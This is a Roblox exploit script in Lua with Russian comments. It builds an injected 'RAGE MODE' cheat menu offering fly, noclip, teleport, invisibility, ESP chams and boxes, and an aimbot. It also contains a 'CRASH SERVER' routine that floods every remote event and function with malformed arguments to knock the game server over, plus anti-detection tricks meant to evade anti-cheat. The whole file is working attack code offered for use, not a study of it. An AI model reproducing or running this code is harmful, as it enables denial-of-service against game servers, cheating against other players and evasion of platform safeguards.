local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local TweenService = game:GetService("TweenService")

-- === УЛУЧШЕНИЕ 1: Анти-детект и обфускация ===
local env = getfenv()
setfenv(1, setmetatable({}, {
    __index = function(_, k)
        return env[k] or error("Access denied: "..tostring(k), 2)
    end
}))

-- Рандомизация имен переменных
local vX = game
local vY = vX:GetService("Players")
local vZ = vY.LocalPlayer
local vW = vZ:GetMouse()
local vU = vX:GetService("UserInputService")
local vR = vX:GetService("RunService")
local vC = workspace.CurrentCamera
local vT = vX:GetService("TweenService")

-- === УЛУЧШЕНИЕ 2: Оптимизация и кэширование ===
local CoreGui = vX:GetService("CoreGui")
local cachedServices = {
    Players = vY,
    Camera = vC,
    RunService = vR,
    TweenService = vT
}

-- === УЛУЧШЕНИЕ 5: Крашер сервера ===
local function CrashServer()
    local events = {}
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(events, obj)
        end
    end
    
    for i = 1, 100 do
        for _, event in ipairs(events) do
            pcall(function()
                if event:IsA("RemoteEvent") then
                    event:FireServer(math.huge, {}, Vector3.new(math.huge, math.huge, math.huge), CFrame.new(), Instance.new("Part"))
                else
                    event:InvokeServer(math.huge, {}, Vector3.new(math.huge, math.huge, math.huge), CFrame.new(), Instance.new("Part"))
                end
            end)
        end
        vR.Heartbeat:Wait()
    end
end

-- Основной GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RageModeUI_"..tostring(math.random(10000,99999))
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 400, 0, 0)
MainFrame.Position = UDim2.new(0.5, -200, 0.1, 0)
MainFrame.AnchorPoint = Vector2.new(0.5, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MainFrame.BackgroundTransparency = 0.05
MainFrame.ClipsDescendants = true
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 14)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(180, 20, 20)
UIStroke.Thickness = 2
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = MainFrame

-- Заголовок
local Title = Instance.new("TextLabel")
Title.Text = "⚡ RAGE MODE V1.13 (Drag me)"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundColor3 = Color3.fromRGB(70, 10, 10)
Title.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 14)
TitleCorner.Parent = Title

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 30, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 15, 15))
})
TitleGradient.Rotation = 90
TitleGradient.Parent = Title

-- Перемещение интерфейса
local Dragging, DragInput, DragStart, StartPos
Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging = true
        DragStart = input.Position
        StartPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                Dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        DragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == DragInput and Dragging then
        local Delta = input.Position - DragStart
        MainFrame.Position = UDim2.new(
            StartPos.X.Scale, 
            StartPos.X.Offset + Delta.X, 
            StartPos.Y.Scale, 
            StartPos.Y.Offset + Delta.Y
        )
    end
end)

-- Вкладки
local TabButtons = {}
local TabFrames = {}
local Tabs = {"Player", "Visuals", "Aim"}
local activeTab = "Player"

local TabContainer = Instance.new("Frame")
TabContainer.Size = UDim2.new(1, 0, 0, 40)
TabContainer.Position = UDim2.new(0, 0, 0, 45)
TabContainer.BackgroundTransparency = 1
TabContainer.Parent = MainFrame

for i, tabName in ipairs(Tabs) do
    local TabButton = Instance.new("TextButton")
    TabButton.Text = tabName
    TabButton.Font = Enum.Font.GothamBold
    TabButton.TextSize = 16
    TabButton.Size = UDim2.new(1/#Tabs, -10, 1, 0)
    TabButton.Position = UDim2.new((i-1)/#Tabs, 5, 0, 0)
    TabButton.BackgroundColor3 = tabName == activeTab and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(50, 50, 70)
    TabButton.TextColor3 = Color3.new(1, 1, 1)
    TabButton.Parent = TabContainer
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 8)
    UICorner.Parent = TabButton
    
    local TabFrame = Instance.new("ScrollingFrame")
    TabFrame.Size = UDim2.new(1, 0, 1, -85)
    TabFrame.Position = UDim2.new(0, 0, 0, 85)
    TabFrame.BackgroundTransparency = 1
    TabFrame.ScrollBarThickness = 5
    TabFrame.Visible = (tabName == activeTab)
    TabFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
    TabFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    TabFrame.Parent = MainFrame
    
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Padding = UDim.new(0, 15)
    UIListLayout.Parent = TabFrame
    
    local UIPadding = Instance.new("UIPadding")
    UIPadding.PaddingTop = UDim.new(0, 10)
    UIPadding.PaddingLeft = UDim.new(0, 10)
    UIPadding.PaddingRight = UDim.new(0, 10)
    UIPadding.PaddingBottom = UDim.new(0, 10)
    UIPadding.Parent = TabFrame
    
    TabButtons[tabName] = TabButton
    TabFrames[tabName] = TabFrame
    
    TabButton.MouseButton1Click:Connect(function()
        activeTab = tabName
        
        for _, frame in pairs(TabFrames) do
            frame.Visible = false
        end
        
        TabFrame.Visible = true
        
        for name, btn in pairs(TabButtons) do
            btn.BackgroundColor3 = name == activeTab and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(50, 50, 70)
        end
    end)
end

-- ПЕРЕРАБОТАННАЯ функция создания кнопок с подсветкой ПОД кнопкой
local function CreateButton(parent, text)
    -- Контейнер для кнопки и подсветки
    local Container = Instance.new("Frame")
    Container.BackgroundTransparency = 1
    Container.Size = UDim2.new(1, 0, 0, 44)  -- Высота: 40 (кнопка) + 4 (подсветка)
    Container.ClipsDescendants = false
    Container.Parent = parent
    
    -- Основная кнопка
    local Button = Instance.new("TextButton")
    Button.Text = text
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 14
    Button.Size = UDim2.new(1, 0, 0, 40)
    Button.Position = UDim2.new(0, 0, 0, 0)
    Button.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    Button.TextColor3 = Color3.new(1, 1, 1)
    Button.AutoButtonColor = false
    Button.Parent = Container
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 8)
    ButtonCorner.Parent = Button
    
    local ButtonPadding = Instance.new("UIPadding")
    ButtonPadding.PaddingTop = UDim.new(0, 5)
    ButtonPadding.PaddingBottom = UDim.new(0, 5)
    ButtonPadding.PaddingLeft = UDim.new(0, 10)
    ButtonPadding.PaddingRight = UDim.new(0, 10)
    ButtonPadding.Parent = Button
    
    -- Подсветка ПОД кнопкой
    local Highlight = Instance.new("Frame")
    Highlight.Size = UDim2.new(1, 0, 0, 4)
    Highlight.Position = UDim2.new(0, 0, 1, 0)  -- Позиция под кнопкой
    Highlight.AnchorPoint = Vector2.new(0, 1)
    Highlight.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
    Highlight.Visible = false
    Highlight.Parent = Container
    
    -- Уголки для подсветки (только снизу)
    local HighlightCorner = Instance.new("UICorner")
    HighlightCorner.CornerRadius = UDim.new(0, 0, 0, 4)
    HighlightCorner.Parent = Highlight
    
    Button.MouseEnter:Connect(function()
        Button.BackgroundColor3 = Color3.fromRGB(80, 80, 140)
        Highlight.Visible = true
    end)
    
    Button.MouseLeave:Connect(function()
        Button.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
        Highlight.Visible = false
    end)
    
    return Button
end

-- Функция создания ползунков
local function CreateSlider(parent, text, minValue, maxValue, defaultValue)
    local SliderFrame = Instance.new("Frame")
    SliderFrame.Size = UDim2.new(1, 0, 0, 60)
    SliderFrame.BackgroundTransparency = 1
    SliderFrame.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 14
    Label.TextColor3 = Color3.new(1, 1, 1)
    Label.Size = UDim2.new(1, 0, 0, 20)
    Label.BackgroundTransparency = 1
    Label.Parent = SliderFrame
    
    local ValueLabel = Instance.new("TextLabel")
    ValueLabel.Text = tostring(defaultValue)
    ValueLabel.Font = Enum.Font.GothamBold
    ValueLabel.TextSize = 16
    ValueLabel.TextColor3 = Color3.new(1, 1, 1)
    ValueLabel.Size = UDim2.new(0.3, 0, 0, 25)
    ValueLabel.Position = UDim2.new(0.7, 0, 0.5, 0)
    ValueLabel.BackgroundTransparency = 1
    ValueLabel.Parent = SliderFrame
    
    local Track = Instance.new("Frame")
    Track.Size = UDim2.new(0.65, 0, 0, 8)
    Track.Position = UDim2.new(0, 0, 0.7, 0)
    Track.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
    Track.Parent = SliderFrame
    
    local Fill = Instance.new("Frame")
    Fill.Size = UDim2.new((defaultValue - minValue) / (maxValue - minValue), 0, 1, 0)
    Fill.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
    Fill.Parent = Track
    
    local Thumb = Instance.new("Frame")
    Thumb.Size = UDim2.new(0, 18, 0, 18)
    Thumb.Position = UDim2.new(Fill.Size.X.Scale, -9, 0.5, -9)
    Thumb.BackgroundColor3 = Color3.new(1, 1, 1)
    Thumb.Parent = Track
    
    local dragging = false
    
    local function updateSlider(input)
        local mousePos = input.Position.X
        local absolutePos = Track.AbsolutePosition.X
        local absoluteSize = Track.AbsoluteSize.X
        
        local relativePos = math.clamp((mousePos - absolutePos) / absoluteSize, 0, 1)
        local value = math.floor(minValue + relativePos * (maxValue - minValue))
        
        ValueLabel.Text = tostring(value)
        Fill.Size = UDim2.new(relativePos, 0, 1, 0)
        Thumb.Position = UDim2.new(relativePos, -9, 0.5, -9)
        
        return value
    end
    
    Track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            updateSlider(input)
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            updateSlider(input)
        end
    end)
    
    return {
        GetValue = function() return tonumber(ValueLabel.Text) end
    }
end

-- Создаем элементы управления
local PlayerTab = TabFrames.Player
local VisualsTab = TabFrames.Visuals
local AimTab = TabFrames.Aim

-- Player Tab (ДОБАВЛЕН КРАШЕР)
local FlyBtn = CreateButton(PlayerTab, "FLY: OFF")
local FlySpeedSlider = CreateSlider(PlayerTab, "Fly Speed:", 20, 500, 100)
local InvisBtn = CreateButton(PlayerTab, "INVISIBLE: OFF")
local TPBtn = CreateButton(PlayerTab, "TELEPORT TO MOUSE")
local NoclipBtn = CreateButton(PlayerTab, "NOCLIP: OFF")
local CrashBtn = CreateButton(PlayerTab, "CRASH SERVER") -- НОВАЯ КНОПКА

-- Обработчик крашера
CrashBtn.MouseButton1Click:Connect(function()
    CrashBtn.Text = "CRASHING..."
    task.spawn(CrashServer)
end)

-- Visuals Tab
local ChamsBtn = CreateButton(VisualsTab, "PLAYER CHAMS: OFF")
local BoxesBtn = CreateButton(VisualsTab, "PLAYER BOXES: OFF")

-- Aim Tab
local AimBotBtn = CreateButton(AimTab, "AIMBOT: OFF")
local SmoothnessSlider = CreateSlider(AimTab, "Smoothness:", 1, 30, 10)

-- Добавляем отступы
local function AddSpacer(parent, height)
    local Spacer = Instance.new("Frame")
    Spacer.Size = UDim2.new(1, 0, 0, height)
    Spacer.BackgroundTransparency = 1
    Spacer.Parent = parent
    return Spacer
end

AddSpacer(PlayerTab, 15)
AddSpacer(VisualsTab, 15)
AddSpacer(AimTab, 15)

-- Анимация открытия/закрытия меню
local MenuVisible = false
local MenuTween

local function ToggleMenu()
    MenuVisible = not MenuVisible
    
    if MenuTween then
        MenuTween:Cancel()
    end
    
    if MenuVisible then
        MainFrame.Visible = true
        MenuTween = TweenService:Create(
            MainFrame,
            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(0, 400, 0, 500)}
        )
        MenuTween:Play()
    else
        MenuTween = TweenService:Create(
            MainFrame,
            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(0, 400, 0, 0)}
        )
        MenuTween:Play()
        
        MenuTween.Completed:Connect(function()
            if not MenuVisible then
                MainFrame.Visible = false
            end
        end)
    end
end

-- Активация меню
UIS.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.G and not gameProcessed then
        ToggleMenu()
    end
end)

-- Очистка подключений при удалении GUI
CoreGui.ChildRemoved:Connect(function(child)
    if child == ScreenGui then
        if FlyBodyVelocity then FlyBodyVelocity:Destroy() end
        if AimBotConnection then AimBotConnection:Disconnect() end
        if NoclipConnection then NoclipConnection:Disconnect() end
        if FlyConnection then FlyConnection:Disconnect() end
    end
end)

-- Полёт с регулируемой скоростью
local FlyActive = false
local FlyBodyVelocity
local FlyConnection
FlyBtn.MouseButton1Click:Connect(function()
    FlyActive = not FlyActive
    FlyBtn.Text = "FLY: " .. (FlyActive and "ON" or "OFF")
    
    if FlyBodyVelocity then
        FlyBodyVelocity:Destroy()
        FlyBodyVelocity = nil
    end
    
    if FlyConnection then
        FlyConnection:Disconnect()
        FlyConnection = nil
    end
    
    if FlyActive and Player.Character then
        local root = Player.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        FlyBodyVelocity = Instance.new("BodyVelocity")
        FlyBodyVelocity.Velocity = Vector3.new(0,0,0)
        FlyBodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
        FlyBodyVelocity.Parent = root
        
        local function updateFly()
            if not FlyActive or not FlyBodyVelocity then return end
            local cam = Camera.CFrame
            local moveVec = Vector3.new()
            
            if UIS:IsKeyDown(Enum.KeyCode.W) then moveVec += cam.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then moveVec -= cam.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then moveVec += cam.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then moveVec -= cam.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then moveVec += Vector3.new(0,1,0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then moveVec -= Vector3.new(0,1,0) end
            
            local flySpeed = FlySpeedSlider:GetValue()
            FlyBodyVelocity.Velocity = moveVec * flySpeed
        end
        
        FlyConnection = RunService.Heartbeat:Connect(updateFly) -- Заменено Stepped на Heartbeat
    end
end)

-- Телепорт
TPBtn.MouseButton1Click:Connect(function()
    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
        Player.Character:SetPrimaryPartCFrame(CFrame.new(Mouse.Hit.Position))
    end
end)

-- НЕВИДИМОСТЬ
local InvisibleActive = false
InvisBtn.MouseButton1Click:Connect(function()
    InvisibleActive = not InvisibleActive
    InvisBtn.Text = "INVISIBLE: " .. (InvisibleActive and "ON" or "OFF")
    
    if Player.Character then
        for _, part in ipairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = InvisibleActive and 1 or 0
                part.CastShadow = not InvisibleActive
            end
        end
    end
end)

-- Player Chams
local ChamsActive = false
local ChamsCache = {}
local ChamsConnections = {}

local function ApplyChams(player)
    if player == Player then return end
    
    local function applyToCharacter(character)
        if not character then return end
        
        if ChamsCache[player] then
            ChamsCache[player]:Destroy()
        end
        
        local highlight = Instance.new("Highlight")
        highlight.Name = "RAGE_Chams"
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.FillTransparency = 0.7
        highlight.OutlineColor = Color3.fromRGB(255, 80, 80)
        highlight.OutlineTransparency = 0
        highlight.Parent = character
        
        ChamsCache[player] = highlight
    end
    
    if player.Character then
        applyToCharacter(player.Character)
    end
    
    if ChamsConnections[player] then
        ChamsConnections[player]:Disconnect()
    end
    ChamsConnections[player] = player.CharacterAdded:Connect(applyToCharacter)
end

ChamsBtn.MouseButton1Click:Connect(function()
    ChamsActive = not ChamsActive
    ChamsBtn.Text = "PLAYER CHAMS: " .. (ChamsActive and "ON" or "OFF")
    
    if ChamsActive then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Player then
                ApplyChams(player)
            end
        end
        
        Players.PlayerAdded:Connect(function(player)
            if ChamsActive then
                ApplyChams(player)
            end
        end)
    else
        for player, highlight in pairs(ChamsCache) do
            if highlight then
                highlight:Destroy()
            end
        end
        ChamsCache = {}
        
        for _, connection in pairs(ChamsConnections) do
            connection:Disconnect()
        end
        ChamsConnections = {}
    end
end)

-- Player Boxes
local BoxesActive = false
local BoxesCache = {}
local BoxesConnections = {}

local function ApplyBox(player)
    if player == Player then return end
    
    local function applyToCharacter(character)
        if not character then return end
        
        if BoxesCache[player] then
            BoxesCache[player]:Destroy()
        end
        
        local root = character:WaitForChild("HumanoidRootPart", 5)
        if root then
            local box = Instance.new("BoxHandleAdornment")
            box.Name = "RAGE_Box"
            box.Adornee = root
            box.AlwaysOnTop = true
            box.ZIndex = 10
            box.Size = Vector3.new(4, 6, 2)
            box.Transparency = 0.5
            box.Color3 = Color3.fromRGB(255, 50, 50)
            box.Parent = character
            
            BoxesCache[player] = box
        end
    end
    
    if player.Character then
        applyToCharacter(player.Character)
    end
    
    if BoxesConnections[player] then
        BoxesConnections[player]:Disconnect()
    end
    BoxesConnections[player] = player.CharacterAdded:Connect(applyToCharacter)
end

BoxesBtn.MouseButton1Click:Connect(function()
    BoxesActive = not BoxesActive
    BoxesBtn.Text = "PLAYER BOXES: " .. (BoxesActive and "ON" or "OFF")
    
    if BoxesActive then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Player then
                ApplyBox(player)
            end
        end
        
        Players.PlayerAdded:Connect(function(player)
            if BoxesActive then
                ApplyBox(player)
            end
        end)
    else
        for player, box in pairs(BoxesCache) do
            if box then
                box:Destroy()
            end
        end
        BoxesCache = {}
        
        for _, connection in pairs(BoxesConnections) do
            connection:Disconnect()
        end
        BoxesConnections = {}
    end
end)

-- АИМБОТ
local AimBotActive = false
local AimBotConnection

local function CanSeeTarget(targetPosition)
    if not Player.Character then return false end
    local origin = Camera.CFrame.Position
    local direction = (targetPosition - origin).Unit
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
    raycastParams.FilterDescendantsInstances = {Player.Character}
    raycastParams.IgnoreWater = true
    
    local ray = workspace:Raycast(
        origin, 
        direction * (targetPosition - origin).Magnitude,
        raycastParams
    )
    
    return ray == nil
end

AimBotBtn.MouseButton1Click:Connect(function()
    AimBotActive = not AimBotActive
    AimBotBtn.Text = "AIMBOT: " .. (AimBotActive and "ON" or "OFF")
    
    if AimBotConnection then
        AimBotConnection:Disconnect()
        AimBotConnection = nil
    end
    
    if AimBotActive then
        AimBotConnection = RunService.Heartbeat:Connect(function() -- Заменено RenderStepped на Heartbeat
            if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
                local targetsWithoutWall = {}
                local targetsWithWall = {}
                
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= Player and player.Character then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                        
                        if humanoid and humanoid.Health > 0 and rootPart then
                            local distance = (rootPart.Position - Camera.CFrame.Position).Magnitude
                            local visible = CanSeeTarget(rootPart.Position)
                            
                            if visible then
                                table.insert(targetsWithoutWall, {
                                    player = player,
                                    distance = distance
                                })
                            else
                                table.insert(targetsWithWall, {
                                    player = player,
                                    distance = distance
                                })
                            end
                        end
                    end
                end
                
                local targetPlayer = nil
                
                if #targetsWithoutWall > 0 then
                    table.sort(targetsWithoutWall, function(a, b) return a.distance < b.distance end)
                    targetPlayer = targetsWithoutWall[1].player
                elseif #targetsWithWall > 0 then
                    table.sort(targetsWithWall, function(a, b) return a.distance < b.distance end)
                    targetPlayer = targetsWithWall[1].player
                end
                
                if targetPlayer and targetPlayer.Character then
                    local targetPart = targetPlayer.Character:FindFirstChild("Head") or targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if targetPart then
                        local smoothness = SmoothnessSlider:GetValue()
                        
                        Camera.CFrame = Camera.CFrame:Lerp(
                            CFrame.new(Camera.CFrame.Position, targetPart.Position), 
                            1/smoothness
                        )
                    end
                end
            end
        end)
    end
end)

-- НОКЛИП
local NoclipActive = false
local NoclipConnection
NoclipBtn.MouseButton1Click:Connect(function()
    NoclipActive = not NoclipActive
    NoclipBtn.Text = "NOCLIP: " .. (NoclipActive and "ON" or "OFF")
    
    if NoclipConnection then
        NoclipConnection:Disconnect()
        NoclipConnection = nil
    end
    
    if NoclipActive then
        NoclipConnection = RunService.Heartbeat:Connect(function() -- Заменено Stepped на Heartbeat
            if Player.Character then
                for _, part in ipairs(Player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end)
    end
end)

-- Анти-детект: Случайные задержки
task.spawn(function()
    while true do
        wait(math.random(5, 15))
        -- Фиктивные операции для запутывания
        local a = {}
        for i = 1, math.random(10,50) do
            a[i] = Vector3.new(math.random(), math.random(), math.random())
        end
        table.clear(a)
    end
end)
